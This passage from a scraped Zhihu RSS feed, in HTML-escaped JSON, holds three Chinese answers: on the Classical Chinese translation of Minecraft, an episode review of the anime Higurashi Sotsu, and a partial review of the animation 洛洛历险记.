data-rawwidth=\"518\" data-rawheight=\"596\" data-watermark=\"watermark\" data-original-src=\"v2-6f5c712ffdac22057c3adca5ff806005\" data-watermark-src=\"v2-4c7e009210e25bac3351bf69d647b5a8\" data-private-watermark-src=\"\"></p>\n<p>大家会注意到，有时在启动已下载过的版本之前，依旧会从Mojang服务器重新下载游戏资源文件。这大多是翻译文件的更新。一般来说，Mojang会维护最新两个大版本的翻译。这也是为什么你在1.16.5也能看到文言选项。</p>\n<h2>关于翻译组</h2>\n<p><i>独家爆料：文言翻译组内竟没有一个古人！</i></p>\n<p>Minecraft文言的翻译组是2020年2月建立的，直到2021年1月21号文言上线Crowdin，翻译进度还是很惨淡。</p>\n<p>我赶在寒假和几次节假日/周末，在群内组织了多次讨论，确定了一部分词汇的译法，但想赶在1.17发布前完成校对的愿望还是过于美好。直到4月底，翻译进度为98%，校对进度仅为14%。五一假期及之后猛肝了一波，最终在5月中旬，校对进度突破了58%。</p>\n<p>有人推荐我们参考《汉典》等专业书。没错，我们都用到了，纸质和线上的资源。很少有应用或游戏会有文言翻译，所以我们的基本无从借鉴。但我能确定，游戏中已校对的翻译，几乎都能在讨论群里找到几十条关于其的讨论，这些翻译大都是我们尽力考证过争辩后得出的。</p>\n<p><b>我们是普通玩家，但我们真的有用心整活。</b></p>\n<p>如果有古汉语专业的玩家，请速联系我们，不胜荣幸。</p>\n<h2>其他</h2>\n<p>中文Minecraft Wiki积极参与了Minecraft简体中文版本的翻译。其中主要参与者Craft Lawrence、Powup333和Sjjklh有幸被官方赠予印有中国国旗的特殊翻译者披风。同时这三名成员也获得了简体中文版本的校对员资格，并维护简体中文版本的翻译至2018年。</p>\n<p>文言语言使用繁体是为了承古风。</p>\n<p>文言在语言列表的中间是因为其ISO 639-3代码为lzh（Literary Chinese）。</p>\n<p>2021年7月6日发布了1.17.1正式版，我们这周修改了大量问题，新的翻译会实装到此版本，欢迎体验。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-28630ad281f5956da3d632a5e6ee01da_720w.png?rss\" data-caption=\"蜜脾块，确信\" data-size=\"normal\" data-rawwidth=\"340\" data-rawheight=\"166\" data-watermark=\"watermark\" data-original-src=\"v2-28630ad281f5956da3d632a5e6ee01da\" data-watermark-src=\"v2-407ec565a6a0ff6f0dab9e5aa6e5a757\" data-private-watermark-src=\"v2-5a520f5c85cef1b9e53be6fbf7006c05\"></p>\n<p>最近一周一直在努力校对词条，并收集玩家的反馈建议。感谢各位玩家的支持与指正，我们会继续整个文化自信的好活。</p>\n<p>对于文言翻译的建议以及加入翻译组的申请，可以评论本回答或私聊我。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ff98sha?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ff98sha</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">57 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/26584294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">微软会不会把 Minecraft 换引擎重制一遍？</a><br><a href=\"http://www.zhihu.com/question/406965213?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">朋友开了我的世界中国版本地联机房并加了些mod，我收到存档后，导入单人显示forge mod什么的?</a><br>\n","link":"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年7月开播的动画《寒蝉鸣泣之时 卒》？","date":"2021-07-05 11:30:09","description":"\n<p>终于等到《卒》了！继续分集评析，一周一更。</p>\n<p>关于《业》的分集解读请看这里：</p>\n<a href=\"https://www.zhihu.com/question/423143915/answer/1513310105\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-c9329c58a0897eeec4285a4ee7605796_bh.jpg\" data-image-width=\"2880\" data-image-height=\"1800\" class=\"internal\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><p><br></p>\n<p>关于《卒》的一些基本认识：《卒》是解题篇，一共十五集，而第一篇的《鬼明篇》是《鬼骗篇》的解答，所以这样子来看前三篇都是对《业》中前三篇的解答，一定程度上也分别对应《解》中的前三篇。顺带一提，鬼明篇的前两话其实是一起放送的，只不过第一话在1号11：30半放送，第二话则是在2号零点开始。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-098eacb3f028b4f8b9c11bde5c0768d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"826\" data-rawheight=\"394\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>7.1 鬼明篇：其一</b></h2>\n<p>• 鬼明篇的开头与鬼骗篇一致，但从一些细节中可以看出，我们观剧的视角发生了翻转，于是本篇中我们是从作为黑幕的沙都子和礼奈的角度来看待整个故事的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-26bcf64e7034552b19e4d497fb0dde0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在鬼骗篇同款opening sequence之后，追加了沙都子的独白</p>\n<p><br></p>\n<p>• 本篇很明显能看出《罪灭篇》的成分：礼奈的父亲遭遇间宫莉娜、礼奈开始回想过去的的不幸以及自己从礼奈变成蕾娜的契机，这些都是罪灭篇的基本配置。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c18235e6a24b16838266fa9f7737ecea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bc2f61eaf9c4c5ab14b41da730267719_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4db6ace9f6ab0999a10d13a3b57ae505_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本作承袭《业》中的「镜像翻转」要素，在一些场景中以镜像作为暗示，譬如下图中的沙都子，在窗户中的倒影是轮回者状态。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9139a72234ba4392fabb407fd703504b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>注意眼睛</p>\n<p><br></p>\n<p>• 本集中明确了骗篇的凶手应该都是因为沙都子的注射而发病的，而结合铁平与下一集的莉娜，此处有一种可能，那就是在业力的影响下，各个碎片的凶手和发病者都会主动去回避曾经的错误，导致每个碎片在不被沙都子干涉的情况下都可以走向幸福的结局。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c6c7c163b68a3b42dd8b9e32cecfdb01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>沙都子为礼奈施打药物</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e66175e98e2283cdb92d47054126f0ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>礼奈睡得真沉...</p>\n<p><br></p>\n<p>• 礼奈在药物的影响下进入了发病的状态，并且不由自主地回想起来过去与母亲之间不愉快的回忆。值得一提的是，旧作里礼奈的父母应该都是没露脸的，不过本次倒是都老老实实地画了出来；礼奈母亲怀孕的细节得到了强调，不知道是否是在为与《命》的联动作铺垫（《命》主角之一的凤谷菜央是礼奈同母异父的妹妹，就是此处腹中的胎儿）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-18597a2b0e80475fa0c41c3afe6783b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-63f88057c539856b55de5204c306cb65_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>跟小学生说这种话，真的大丈夫？</p>\n<p><br></p>\n<p>• 礼奈发病后有大量自言自语的场景，这虽然显得有点解说性过强，但配合发病时的癫狂来看还挺带感的。不得不说，本作里对于lv5状态时的疯狂姿态描绘得非常好，观赏性要远大于旧作。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-26fac28c9f9bd2520381890a611c0857_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1c6d87f1e76cbb5ad7a66be55cbbd160_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-64dd7121ee7797f1a521b335cc4cc52a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这张礼奈好可爱啊</p>\n<p><br></p>\n<p>• 和铁平相似，这个碎片中的莉娜也开始良心发现，从一开始就没有作恶的动机。所以本篇本来可以走向一个幸福的结局（毕竟铁平和鹰野也不会搞事），但在沙都子的介入下被破坏了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d8d85ac1317e8086fbe437c4a170ba2d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-937215a84c1fe9206bf08da9dae4ae6a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这样的莉娜很少见，令我对原本纯黑的她产生了一丝怜悯</p>\n<h2>7.2 鬼明篇：其二</h2>\n<p>（因为这集还没中文资源，所以只能在Hulu上一边看一边用手机拍照了）</p>\n<p>• 礼奈开始进行谋杀的准备，恰好碰上莉娜自己找上门来。值得一提的是，似乎是为了映衬礼奈的这种癫狂状态，这个夕阳西下的场景里，配色也有一种妖异的感觉，让人想起了「さよならを教えて」。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c321cd23d70fc86963ca366ccfe1a839_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b46f6f2738d44d873e6ad4ec1e1cb2f2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 在礼奈的秘密据点内，莉娜想要对她敞开心扉，结果被发狂的礼奈袭击。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-af526b91b19f2f8dd39568ef24a97cfb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7b608ed7a23bb0a2edbb61d7f5cdba13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 不得不说，礼奈在本集的发狂场景作画非常不错，狂乱之余，不失魄力。值得一提的是，因为注射所导致的发病状态，似乎和自然发病是存在区别的，譬如这里的礼奈就比罪灭篇要更具有侵略性。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-218a4a0c805471ce119db135ce3bc1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-bd17c04b14768e58db01b7533cb68a1b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b17a0efba457fe5d118de8b80644d5f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 沙都子就在案发现场的山坡上远远观望，此处的构图与《业》第一集时梨花俯瞰圭一的场景一模一样，再度强调了立场和视角的反转。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c105c778c1df125d3dd7127431ba487e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3da66c9dfc57c0fbea3f7e2b2addd5d5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 第二天，试图在垃圾山继续处理尸体的礼奈，碰上了追寻她而来的圭一，并开始疑神疑鬼。这个疑心状态下的礼奈，在其表情的描绘上，风格比较写实化，因而产生了一种奇妙的反差，个人非常喜欢。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9fb706752e6089cd73ea00023cccad8b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4ab20761a812eb0b858733971132acb5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈在回家的路上遇见了大石，得知警方在调查间宫莉娜的失踪，因而承受了更多的精神压力。不过，即使是在这样的状态下，她也没有让大石看出破绽，可见礼奈的自制能力和冷静程度都非常可怕。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-39239679db952d647229cab7b2c46303_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2>关于前两集的简评</h2>\n<p>• 相较于《业》来说，《卒》的前两集可以说是照常发挥，各方面延续了《业》的特点以外，也继承了「新内容+剧情复盘」的模式，可见制作方对《卒》仍旧抱有拉新观众入坑的期望。</p>\n<p>• 可能是为了与《业》对接，《卒》中有不少直接从《业》里照搬的段落和画面，不过也许是因为这一点节省了开支，所以在新场面的描绘上有了更好的发挥，譬如这两集中礼奈发病的场面。</p>\n<p>• 结合《乡坏篇》和《鬼明篇》来看，出题篇之所以命名为《业》，大概是因为每个角色都要为自己曾经的罪业付出代价，因而与为自己所拖累的人进行了位置的转换，从被害者变成了加害者，所以之后的绵明篇和祟明篇大概也是类似的走向。</p>\n<p>• 总觉得《卒》的画风好像变得更顺眼了，不知道是因为自己看习惯了，还是绘柄真的变了，总觉得之前的那种肥而圆的感觉好像没有那么明显了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/gris-griffith?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">岸边的塞涅卡</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">7 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/322053588?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">看完并喜欢动画《寒蝉鸣泣之时》系列，可能会是怎样的人？</a><br><a href=\"http://www.zhihu.com/question/423143915?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><br>\n","link":"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价洛洛历险记？","date":"2021-07-05 03:00:11","description":"\n<blockquote>其实，人生就是一场游戏，游戏就是一场人生。只不过这场游戏你想玩也得玩，不想玩也得玩。</blockquote>\n<p>《洛洛历险记》是蓝弧巅峰期的开始，亦是其巅峰期的结束。</p>\n<h3>背景</h3>\n<p>蓝弧动画的前身是蓝弧信息科技有限公司，创建日期为2003年，其法人为王巍，亦是导演多部蓝弧作品之人。</p>\n<p>03-07年，亦曾制作多过部动画，但是市场并无太大反响。</p>\n<p>而为他人打工而制作的《猪猪侠》则是却意外地火了。</p>\n<p>猪猪侠前四部，是猪猪侠其口碑最好之时，亦是蓝弧所制作。不过09年之后便不再参与制作，其导演以及编剧不再是王巍，现如今版权归属于广东咏声动漫股份有限公司。</p>\n<p>在此之后，猪猪侠剧情便越来越差，其IP价值也远不如以前。</p>\n<p>07-09年，蓝弧相继推出了《果冻宝贝》以及《果冻三剑客》，这两部动画可以说是《果宝特攻》的前传，但又不全是，因为很多概念都发生改变。这两部动画获得一定反响，或是星杰相中其实力，而前来与蓝弧合作。</p>\n<p>《洛洛历险记》里面的机车族，与变形金刚系列的汽车人有些相似，尤其是其变身方式。也是因此，有人称其为中国版的变形金刚。不过，也有人称《洛洛》抄袭《变形金刚》。</p>\n<p>不是，我在这里说一句。</p>\n<p>《洛洛历险记》与其相似是有缘故的，其IP来源有些许复杂，有点长。那就从其源头开始讲吧。</p>\n<p>美国有一个Tonka公司，在1982年生产了一个名为Go-Bots的机器人玩具，1983年改名为“百变雄师”，销量很高，买得比孩子宝还要好。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-46e709c1a73cb1268ea162d4a92bf0fa_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1468\" data-size=\"normal\" data-caption=\"看图便可知此物与变形金刚的差距\" data-watermark=\"original\" data-original-src=\"v2-46e709c1a73cb1268ea162d4a92bf0fa\" data-watermark-src=\"v2-4c170278910b67d2a97870da2157fcd4\" data-private-watermark-src=\"v2-60921c269f5968f511766e453ce74f79\"></p>\n<p>不过等到孩之宝创造了变形金刚系列之后，其形势便逆转了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c1847547d4908aed919a046939b20800_720w.jpg?rss\" data-rawwidth=\"420\" data-rawheight=\"597\" data-size=\"normal\" data-caption=\"差距一眼便得知\" data-watermark=\"original\" data-original-src=\"v2-c1847547d4908aed919a046939b20800\" data-watermark-src=\"v2-ba49232f509ab43e14aeb9df6bdf81cd\" data-private-watermark-src=\"v2-33d34ca63129dd5e93e47d67ece2b606\"></p>\n<p>此后，在1991年Tonka以及其《百变雄师》的版权被孩之宝收购。为了做出差异化处理，让其向子供向发展。</p>\n<p>待到榨干最后一滴价值时，便废置了它。</p>\n<p>而中国的星杰相中了它，便买下来并更名为“百变机兽”。</p>\n<blockquote>广州市星杰玩具有限公司成立于2003年，是一家集动漫产业的研发与生产，拍摄与制作，发行与销售，包装与配送于一体的综合性专业文化企业。<br>     一直以来，公司致力于右脑项目的开发，创作性思维为主的变形玩具的研制，先后推出十多个变形系列，上百余款变形产品，缔造了变形玩具销售奇迹，蜚声业界。<br>     公司拥有国内顶尖的创作、编剧、导演、摄像等核心制作团队，潜心原创动漫的创作。2008年斥巨资拍摄全球第一部注入中国武侠元素的52集全三维动画《百变机兽之洛洛历险记》，在全国省市电视台掀起了热播的狂潮，同名系列玩具“百变机兽”，瞬间风靡各地，并成为变形玩具的经典。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"\" data-url=\"http://starjet.b.ctoy.com.cn/\">[1]</sup>\n</blockquote>\n<p>上面是官网的介绍，不过就洛洛历险记的成片而言，并未展现其巨资，也许是蓝弧第一次做这种（战斗）作品，动作戏方面稍显拙劣。</p>\n<p>并且于2008年投资蓝弧，定好玩具的形象与名字，其它方面均由蓝弧负责。</p>\n<blockquote>于是星杰又找到蓝弧动画，由星杰提供玩具形象，蓝弧来改编动画，相当于动画是蓝弧原创的，只是人物名和造型是星杰早就定好的，这些造型来源就是原先孩之宝的百变雄师系列，然后经过改动而成的星杰百变机兽系列玩具。所以这里面的关系也就清晰了吧<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\" data-text=\"\" data-url=\"https://tieba.baidu.com/p/6176518550?red_tag=2325471446\">[2]</sup>\n</blockquote>\n<p>其动画名正是《百变机兽之洛洛历险记》。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-84d8aaf1fff0ffc8e3d32eea48a466aa_720w.jpg?rss\" data-rawwidth=\"752\" data-rawheight=\"560\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-84d8aaf1fff0ffc8e3d32eea48a466aa\" data-watermark-src=\"v2-f7a8d33f5424106779ad1c7408dbef02\" data-private-watermark-src=\"v2-3ffd9726067d66818a2b80b69d55bdda\"></p>\n<p>星杰要卖玩具，蓝弧需要钱做动画来展现自己的实力，二者一拍即合。</p>\n<p>就当时结果而言，这是一个双赢的局面。</p>\n<p>《洛洛历险记》大火，其玩具销量亦非常好。蓝弧也因这部动画名声大躁，也走向了巅峰期。</p>\n<p>不过，亦在此埋下一隐患，先按下不表。</p>\n<h3>原版</h3>\n<p>《洛洛历险记》是一部由蓝弧制作，集数为52集的3D动画。</p>\n<p>开头，洛洛在暴风雨天气下，仍在玩一个游戏。此游戏其名为《机战王》，此游戏为PvP游戏，里面有机车族与猛兽族方阵营。玩家必须选择一方阵营，然后与另一方阵营进行对战。</p>\n<p>洛洛在这游戏比赛中获得亚军。</p>\n<p>洛洛自然是机车族一方，此时正处于关键时刻，即使是其母亲让其不准打游戏，等她走后仍偷偷打开游戏机。之后便来到了经典桥段，异世界穿越。</p>\n<p>这个与《数码宝贝》的穿越方式类似，天上掉下几束光，便选中了几个主角。而《洛洛》这边自然也很朴素。仅仅只是一个雷电打下来，便穿越过去。</p>\n<p>之后，便开始了异世界之旅。</p>\n<p><b>情节优秀</b></p>\n<p>蓝弧在此处给洛洛安排的是标准的成长型主角剧本。即从零开始，自己与机车族一步步成长，最后与猛兽族能分庭抗礼。</p>\n<p>而此背景是一个机车族与猛兽族相互打仗的世界，机车族四分五裂，是一盘散沙。猛兽族虽然更甚，经常会互相暗算对方，但是有一点很重要，就是比机车族强，无论是其单兵实力，亦或者是其军队实力，都远比机车族强。</p>\n<p>不过机车族比猛兽族强的地方在于，机车族会有混合技，并且是刚刚好克制猛兽族一方的技能。</p>\n<p>并且，开挂相对而言并无多少，更多是智取，而非力敌。</p>\n<p>作为其面向对象（中小学生）而言，此剧本可称之为优秀，即便是成年后回头再看，同样可以顺畅地看下去，人物智商在线，并无太多降智与令人尴尬的情节。</p>\n<p>情节有转折，主线又异常清晰，地图亦更换得恰到好处，遇到之人亦随着人物实力增长而增长，始终处了一个水平当中。</p>\n<p>《洛洛》如若按照其地图划分，可分为时光之城篇、能源之城篇、风雪之城篇、最终决战篇。</p>\n<p>时光之城篇是洛洛进入游戏世界的第一个篇章，也是熟悉这个世界的第一个篇章，所以其对手并没有过强，只是狂野星手下的第一大将——金铁兽。不过为了给其相对应的实力，洛洛遇到的第一个机车族——霹雳火，亦是处于最弱状态，连其技能雷庭半月斩也使不出来。</p>\n<p>第一个篇章，是为了介绍其人物，以及世界观，更重要的是为下一篇章做辅垫。</p>\n<p>相对应的成长实力，洛洛遇到了历史最弱时期的霹雳火。霹雳火，据我所知，其名字出自于《水浒传》中秦明的外号。秦明以脾气暴躁而著称，而霹雳火则是典型的老好人。</p>\n<p>在第一次出场时，即使是敌人，也会劝其不必白白送死。</p>\n<p>于是便从零开始，一点点升级其实力，最后还是有惊无险地击退了金铁兽大军，并与力霸天、霹雳火以及风火轮一同前往能源之城。</p>\n<p>然后便开启了整部作品最优秀的篇章——能源之城篇章。</p>\n<p>这个篇章从第10集《见义勇为》到第35集《龙虎斗》，横跨25集，几乎所有人物悉数登场，能源之城，你方唱罢我方再登场。</p>\n<p>首先，开篇即进入高潮，猛虎王与狂野猩皆想夺取能源之城的能源紫水晶。二者为了争取攻打权，在能源之城外选择一处地方开战。</p>\n<p>猛虎王速度很快，但是很难破狂野猩的防，而狂野猩攻击力强，而速度则慢上许多，无法进猛虎王其身。</p>\n<p>二者各有强项，自身弱点皆是对方强项。这本应该是一场无法分出胜负的一场战斗，不过猛虎王选择用计谋，选用围殴战术，将狂野猩围殴致残。</p>\n<p>关键时刻金铁兽赶到，不过仍不是猛虎王对手，而关键时刻，机车族这边龙卷风、霹雳火和力霸王选择出手相救。这是一个弱肉强食的世界，即强者才能生存。可是除了弱肉强食，还有一群坚守原则的（机器）人。龙卷风讨厌人多欺少，猛虎王则一直喜欢以多欺少，二者正是水火不容的关系。而其霹雳火与力霸天则是极为看重义气，光明磊落之人自是见不惯诡计多端之人。</p>\n<p>人与人的感情，亦会影响其结果，后来洛洛的对手晶晶亦是如此。晶晶使用计谋将三个猛兽王移位，虽然狂野猩和猛虎王都将其对手逼入绝境。不过晶晶却忘了，就算棋子，也是会有个人情感的，棋子不应该不是毫无情感的，也要考虑棋子本身的情感方可成事。</p>\n<p>于是三者皆以不同原因而出手相救，最后都掉到熔浆下。不得不说，这个熔浆的设计是真的不错，熔浆则只是幻象，实则只是障眼法。所有的人都会惧怕掉入熔浆，而能源紫水晶刚好在其熔浆下面。</p>\n<p>最后，猛虎王以金铁兽为人质，换来狂野猩的退走，自此，能源之城的攻防战开始。</p>\n<p>能源之城的人物众多，自本身也是一个易守难攻的城池。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7adcabb92eaaca2599fbc288f8f18169_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"并且能源之城有空军优势\" data-watermark=\"original\" data-original-src=\"v2-7adcabb92eaaca2599fbc288f8f18169\" data-watermark-src=\"v2-25d257efe9031d9ced4bd9baba215d84\" data-private-watermark-src=\"v2-def0fa32c374556b35aa6bc45115c6d4\"></p>\n<p>正面强攻自然不行，于是猛虎王选择诱敌出来，通过歼灭其有生力量。再夺取城池。</p>\n<p>因为城主很谨慎，主动出击会导致一波被翻盘，所以即使是多次失败也不会导致人员损失惨重。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3d3d3b6a48d97c626a0aba34551a6cce_720w.jpg?rss\" data-rawwidth=\"822\" data-rawheight=\"621\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3d3d3b6a48d97c626a0aba34551a6cce\" data-watermark-src=\"v2-24868463521e1c791e687c9a2633572b\" data-private-watermark-src=\"v2-2213119af61c3cbe2effe5e917d9715d\"></p>\n<p>猛虎王的强大，这是众所周知的事实，而为了让机车族拥有打败其能力的信心，猛虎王通过一次次攻城挑战来麻痹众人，一次次地败退，让他们产生可以战胜猛虎王的想法，助长其骄兵气息。最后能源之城选择出击，却以惨败回归。</p>\n<p><img 